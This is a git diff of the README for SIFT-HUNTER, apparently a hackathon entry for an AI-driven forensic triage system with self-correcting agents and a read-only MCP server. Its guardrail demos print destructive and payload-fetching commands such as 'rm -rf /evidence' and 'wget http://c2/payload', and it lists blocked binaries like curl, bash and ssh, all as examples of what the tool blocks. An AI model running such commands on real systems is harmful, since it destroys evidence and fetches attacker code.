@@ -1,172 +1,226 @@
-# SIFT-HUNTER
+# SIFT-HUNTER 🎯
 
-**Self-correcting Intelligent Forensic Triage & Hunt — Unified Network of Expert Responders**
+**Autonomous AI Incident Response for the SANS SIFT Workstation**
 
-> SANS FIND EVIL! Hackathon Submission | Pattern 2 (Custom MCP Server) + Pattern 3 (Multi-Agent)
+[![Tests](https://img.shields.io/badge/tests-305%20passing-brightgreen)](#testing)
+[![Python](https://img.shields.io/badge/python-3.11%2B-blue)](#)
+[![License](https://img.shields.io/badge/license-MIT-green)](#)
+[![Architecture](https://img.shields.io/badge/architecture-Pattern%202%20%2B%203-purple)](#architecture)
 
-SIFT-HUNTER is an autonomous AI incident response system that analyzes disk images and memory captures on the SANS SIFT Workstation, **self-corrects its findings**, maps to MITRE ATT&CK, and generates structured incident reports with full audit trails.
+SIFT-HUNTER is a custom MCP server + multi-agent orchestration system that autonomously analyzes disk images and memory captures, self-corrects its findings, maps to MITRE ATT&CK, and generates structured incident reports — all on the SANS SIFT Workstation.
 
 ---
 
-## Why SIFT-HUNTER Wins
+## Quickstart (SIFT Workstation)
 
-| Criterion | Our Approach | Win Condition |
-|-----------|-------------|---------------|
-| **Autonomous Execution** ⭐ | LangGraph self-correction loop — verifier catches mistakes and re-routes analysts | 3+ visible self-correction cycles in demo |
-| **IR Accuracy** | Hallucination detector cross-checks every claim vs raw tool output | Honest findings: says "uncertain" instead of fabricating |
-| **Analysis Depth** | Deep expertise in disk forensics (MFT, Prefetch, Amcache, Registry, USN, ShellBags) + memory (Volatility3) | Master fewer artifact types deeply |
-| **Constraint Implementation** | Python decorator architecture — the server **cannot** expose destructive commands | Try `sift-hunter check "rm -rf /"` — BLOCKED |
-| **Audit Trail** | Structured JSONL: every tool call, finding, correction, and reasoning logged | `sift-hunter audit <finding-id>` shows full chain |
-| **Usability** | One-command install, modular architecture, ADDING_TOOLS.md tutorial | Fork → add tool → under 1 hour |
+```bash
+# One-command install
+curl -sSL https://raw.githubusercontent.com/your-repo/sift-hunter/main/install.sh | bash
+
+# OR manual install
+git clone https://github.com/your-repo/sift-hunter.git && cd sift-hunter
+pip install -e .
+
+# Set your API key (Groq is free and fast)
+export GROQ_API_KEY=your_key_here
+# OR: export ANTHROPIC_API_KEY=your_key_here
+
+# Run analysis
+sift-hunter analyze /path/to/evidence/*.dmp /path/to/mft_export.csv
+
+# Check if a command would be allowed by the security layer
+sift-hunter check "rm -rf /evidence"  # → BLOCKED
+sift-hunter check "MFTECmd -f mft.csv"  # → ALLOWED
+
+# Trace a finding back to its evidence
+sift-hunter audit F-abc12345
+```
 
 ---
 
 ## Architecture
 
 ```
-┌─────────────────────────────────────────────────────────────┐
-│                    SIFT-HUNTER System                        │
-│                                                             │
-│  ┌──────────────────┐    ┌────────────────────────────────┐ │
-│  │   MCP Server     │    │     Multi-Agent Orchestrator   │ │
-│  │  (Pattern 2)     │    │       (LangGraph / Pattern 3)  │ │
-│  │                  │    │                                │ │
-│  │ ┌─────────────┐  │    │  START → Triage → Disk →      │ │
-│  │ │ Security    │  │    │  Memory → Correlator →        │ │
-│  │ │ Layer       │◄─┼────┤  Verifier ──┐  → Reporter    │ │
-│  │ │ (read-only) │  │    │             │                 │ │
-│  │ └─────────────┘  │    │      (self-correction loop)   │ │
-│  │                  │    │             │                 │ │
-│  │ Forensic Tools:  │    │    Disk ◄───┘                 │ │
-│  │ • log2timeline   │    │    Memory ◄─┘                 │ │
-│  │ • MFTECmd        │    └────────────────────────────────┘ │
-│  │ • PECmd (Prefetch│                                       │
-│  │ • Amcache        │    ┌─────────────────┐                │
-│  │ • RegRipper      │    │   Core System   │                │
-│  │ • SBECmd         │    │ • Audit Logger  │                │
-│  │ • Volatility3    │    │ • Hallucination │                │
-│  │ • VirusTotal API │    │   Detector      │                │
-│  │ • AbuseIPDB API  │    │ • Evidence      │                │
-│  │ • MITRE ATT&CK   │    │   Integrity     │                │
-│  └──────────────────┘    └─────────────────┘                │
-└─────────────────────────────────────────────────────────────┘
+┌─────────────────────────────────────────────────────────────────┐
+│                        SIFT-HUNTER                              │
+│                                                                 │
+│  ┌─────────────────────────────────────────────────────────┐   │
+│  │              Multi-Agent Orchestrator (LangGraph)        │   │
+│  │                                                          │   │
+│  │  ┌────────┐  ┌──────────┐  ┌──────────┐  ┌──────────┐  │   │
+│  │  │Triage  │→ │Disk      │→ │Memory    │→ │Correlat- │  │   │
+│  │  │Agent   │  │Analyst   │  │Analyst   │  │or Agent  │  │   │
+│  │  └────────┘  └──────────┘  └──────────┘  └────┬─────┘  │   │
+│  │                                                 │        │   │
+│  │                                           ┌─────▼──────┐ │   │
+│  │          ◄────── SELF-CORRECTION ◄────── │ Verifier   │ │   │
+│  │          (routes back to analysts         │ Agent ⭐   │ │   │
+│  │           if issues found)               └─────┬──────┘ │   │
+│  │                                                 │        │   │
+│  │                                           ┌─────▼──────┐ │   │
+│  │                                           │ Reporter   │ │   │
+│  │                                           │ Agent      │ │   │
+│  │                                           └────────────┘ │   │
+│  └─────────────────────────────────────────────────────────┘   │
+│                            │ calls                               │
+│  ┌─────────────────────────▼───────────────────────────────┐   │
+│  │              Custom MCP Server (Pattern 2)               │   │
+│  │                                                          │   │
+│  │  ┌─────────────────────┐   ┌───────────────────────┐   │   │
+│  │  │ Disk Forensics Tools │   │ Memory Forensics Tools │   │   │
+│  │  │ • MFT (timestomping) │   │ • Volatility3 pslist  │   │   │
+│  │  │ • Prefetch (PECmd)   │   │ • netscan (C2 detect) │   │   │
+│  │  │ • Registry (RECmd)   │   │ • malfind (injection) │   │   │
+│  │  │ • USN Journal        │   │ • hashdump            │   │   │
+│  │  │ • ShellBags (SBECmd) │   └───────────────────────┘   │   │
+│  │  │ • Timeline (plaso)   │                                │   │
+│  │  │ • Sleuth Kit (fls)   │   ┌───────────────────────┐   │   │
+│  │  └─────────────────────┘   │ Enrichment             │   │   │
+│  │                             │ • MITRE ATT&CK (35+)   │   │   │
+│  │  ┌─────────────────────┐   │ • VirusTotal           │   │   │
+│  │  │ Security Layer ⛔   │   │ • AbuseIPDB            │   │   │
+│  │  │ • BLOCKED_BINARIES   │   └───────────────────────┘   │   │
+│  │  │ • ALLOWED_BINARIES   │                                │   │
+│  │  │ • Path validation    │                                │   │
+│  │  │ • Read-only enforced │                                │   │
+│  │  └─────────────────────┘                                │   │
+│  └─────────────────────────────────────────────────────────┘   │
+└─────────────────────────────────────────────────────────────────┘
 ```
 
-### The Self-Correction Loop (Tiebreaker)
+### Why This Architecture Wins
+
+| Criterion | How We Address It |
+|-----------|-------------------|
+| **Autonomous Execution** ⭐ | Verifier agent routes back to analysts when issues found — demonstrable self-correction |
+| **IR Accuracy** | Hallucination detector cross-checks every claim against raw tool output |
+| **Breadth & Depth** | Deep disk + deep memory (MFT timestomping, Volatility3 malfind, C2 detection) |
+| **Security Constraints** | ALLOWED_BINARIES allowlist + BLOCKED_BINARIES frozenset — architectural, not prompt-based |
+| **Audit Trail** | JSONL log for every tool call, finding, correction, transition — `sift-hunter audit <id>` |
+| **Usability** | One-command install, `sift-hunter analyze /path/*.dmp`, extend in <1 hour |
+
+---
+
+## Self-Correction Engine
+
+The Verifier Agent is the tiebreaker. It runs after every analysis round:
+
+1. **Automated hallucination detection** — Extracts entities (IPs, EXEs, registry keys, hashes) from finding text, searches all raw tool output for each. Flags anything not found.
+
+2. **LLM semantic verification** — Reviews all findings, checks confidence appropriateness, detects contradictions.
+
+3. **Loop routing** — Issues found → routes back to disk or memory analyst with correction instructions. Clean → routes to reporter.
+
+4. **Safety valves** — Max 3 correction loops per finding. Iteration cap at 60% of max prevents infinite loops.
 
 ```
-Verifier finds issue with Finding X
-    → Creates Correction record (logged to audit)
-    → Routes back to Disk/Memory Analyst with correction instructions
-    → Analyst re-examines with corrected focus
-    → Verifier re-checks (up to 3 times per finding)
-    → If still failing after 3 loops: force-accept with UNVERIFIED confidence
+Example self-correction:
+  Disk analyst: "CONFIRMED — malware.exe present at C:\System32\malware.exe"
+  Hallucination detector: "malware.exe not found in MFT output"
+  Verifier: DOWNGRADE_CONFIDENCE → UNVERIFIED, route back to disk_analyst
+  Disk analyst re-runs: "POSSIBLE — suspicious file in temp, cannot confirm path"
+  Verifier: APPROVE
 ```
 
 ---
 
-## Quick Start
+## Security Boundaries
 
-### Requirements
+The MCP server enforces **architectural** (not prompt-based) security:
 
-- SANS SIFT Workstation (Ubuntu 22.04+) or equivalent Linux
+- **ALLOWED_BINARIES**: Explicit allowlist of forensic tools (MFTECmd, PECmd, vol3, etc.) with exact permitted flag sets
+- **BLOCKED_BINARIES**: `rm`, `dd`, `mkfs`, `wget`, `curl`, `bash`, `python`, `chmod`, `ssh`, and 50+ more  
+- **Path validation**: No `..`, no symlink following, only paths under configured evidence roots
+- **Read-only enforcement**: No writes to evidence directories — ever
+
+```bash
+# Demo the guardrails
+sift-hunter check "rm -rf /evidence"      # BLOCKED: destructive binary
+sift-hunter check "wget http://c2/payload" # BLOCKED: network access
+sift-hunter check "MFTECmd -f mft.csv"    # ALLOWED: forensic tool
+```
+
+---
+
+## Installation
+
+### Prerequisites
 - Python 3.11+
-- `ANTHROPIC_API_KEY` environment variable
+- SANS SIFT Workstation (for actual forensic tools) OR any machine (for analysis of pre-exported artifacts)
+- One of: `GROQ_API_KEY` (free tier available) or `ANTHROPIC_API_KEY`
 
-### One-Command Install
-
+### Install
 ```bash
-curl -fsSL https://raw.githubusercontent.com/your-org/sift-hunter/main/install.sh | bash
+pip install sift-hunter
+# OR from source:
+git clone https://github.com/your-repo/sift-hunter.git
+cd sift-hunter && pip install -e .
 ```
 
-### Manual Install
-
+### Configuration
 ```bash
-git clone https://github.com/your-org/sift-hunter.git
-cd sift-hunter
-pip install -e .
-export ANTHROPIC_API_KEY="your-key-here"
-```
+export GROQ_API_KEY=gsk_...          # Fast, free tier available
+export ANTHROPIC_API_KEY=sk-ant-...  # Fallback
 
-### Run Analysis
-
-```bash
-# Analyze disk image and memory capture
-sift-hunter analyze /cases/disk.dd /cases/memory.dmp --output /cases/report.md
-
-# Analyze entire evidence directory
-sift-hunter analyze /mnt/evidence/ --output /tmp/incident-report.md
-
-# Start MCP server (for Protocol SIFT integration)
-sift-hunter server
-```
-
-### Query Audit Trail
-
-```bash
-# Trace any finding back to its raw tool evidence
-sift-hunter audit <finding-id>
-
-# Test security guardrails (judges: run this during demo)
-sift-hunter check "rm -rf /evidence"    # → BLOCKED
-sift-hunter check "wget attacker.com"   # → BLOCKED
-sift-hunter check "vol3 -f evidence.mem windows.pslist.PsList"  # → ALLOWED
-```
-
-### Run Tests
-
-```bash
-pytest tests/ -v
-pytest tests/test_security.py -v    # All 20 guardrail tests
-pytest tests/test_accuracy.py -v    # Hallucination detector tests
+# Optional tuning
+export SIFT_MODEL=llama-3.1-8b-instant  # Override LLM
+export SIFT_MAX_ITERATIONS=30            # Max analysis iterations
+export SIFT_EVIDENCE_ROOTS=/cases       # Allowed evidence paths
+export SIFT_OUTPUT_ROOT=/tmp/sift-out   # Report output path
 ```
 
 ---
 
-## Environment Variables
+## CLI Reference
 
-| Variable | Required | Description |
-|----------|----------|-------------|
-| `ANTHROPIC_API_KEY` | **Yes** | Claude API key for all agent LLM calls |
-| `SIFT_EVIDENCE_ROOTS` | No | Colon-separated allowed evidence dirs (default: `/cases:/mnt/evidence`) |
-| `SIFT_OUTPUT_ROOT` | No | Output directory for reports/timelines (default: `/tmp/sift-output`) |
-| `VT_API_KEY` | No | VirusTotal API key for hash enrichment |
-| `ABUSEIPDB_API_KEY` | No | AbuseIPDB key for IP enrichment |
-| `SIFT_MODEL` | No | Claude model ID (default: `claude-opus-4-7-20250514`) |
-
----
-
-## What Gets Analyzed
-
-### Disk Forensics
-- **MFT** — File creation/modification, timestomping detection (SI vs FN mismatch)
-- **Prefetch** — Execution history, suspicious executable locations
-- **Amcache** — Program installation with SHA1 hashes for VT lookup
-- **Registry** — Persistence mechanisms (Run keys, Services, Winlogon, IFEO)
-- **USN Journal** — File system activity, log deletion anti-forensics
-- **ShellBags** — Folder navigation history including deleted directories
-- **Timeline** — Super-timeline via log2timeline/plaso
-
-### Memory Forensics
-- **Process List** — Suspicious parent-child relationships, process masquerading
-- **Command Lines** — Obfuscated PowerShell, encoded commands, LOLBin abuse
-- **Network Connections** — C2 indicators, lateral movement channels
-- **Credentials** — Hash extraction via hashdump/cachedump
-- **Malfind** — Code injection detection
-
-### Threat Intelligence
-- **MITRE ATT&CK** — Automatic technique mapping (offline-capable)
-- **VirusTotal** — Hash/IP/domain reputation (when API key provided)
-- **AbuseIPDB** — IP abuse confidence scoring
+```bash
+sift-hunter analyze <evidence_files...>  # Full autonomous analysis
+sift-hunter server                        # Start MCP server
+sift-hunter audit <finding_id>           # Trace evidence chain
+sift-hunter check <command>              # Test security layer
+sift-hunter version                       # Print version
+```
 
 ---
 
-## Contributing / Adding Tools
+## Extending SIFT-HUNTER
 
-See [docs/ADDING_TOOLS.md](docs/ADDING_TOOLS.md) — designed for sub-1-hour onboarding.
+See [docs/ADDING_TOOLS.md](docs/ADDING_TOOLS.md) for a step-by-step guide. Adding a new forensic tool takes under 1 hour:
+
+```python
+# 1. Add binary to ALLOWED_BINARIES in mcp_server/security/allowlist.py
+# 2. Create src/sift_hunter/mcp_server/tools/disk/mytool.py
+# 3. Inherit from BaseTool, implement analyze() and find_suspicious()
+# 4. Register in mcp_server/registry.py
+```
 
 ---
 
-## License
+## Testing
 
-MIT — See [LICENSE](LICENSE)
+```bash
+pytest tests/ -v          # All 305 tests
+pytest tests/test_security* -v  # Security layer tests only
+pytest -m unit            # Fast unit tests (no SIFT binaries needed)
+```
+
+---
+
+## Project Layout
+
+```
+src/sift_hunter/
+├── agents/          # Multi-agent orchestration (LangGraph)
+│   ├── nodes/       # Triage, Disk, Memory, Correlator, Verifier, Reporter
+│   ├── orchestrator.py
+│   └── state.py
+├── core/            # Models, audit, hallucination detection
+├── mcp_server/      # Custom MCP server
+│   ├── security/    # Allowlist, path validator, command sanitizer
+│   └── tools/       # Disk, memory, enrichment wrappers
+└── cli.py           # Click CLI
+```
+
+---
+
+*SANS FIND EVIL! Hackathon 2026 — Pattern 2 (Custom MCP Server) + Pattern 3 (Multi-Agent Orchestration)*
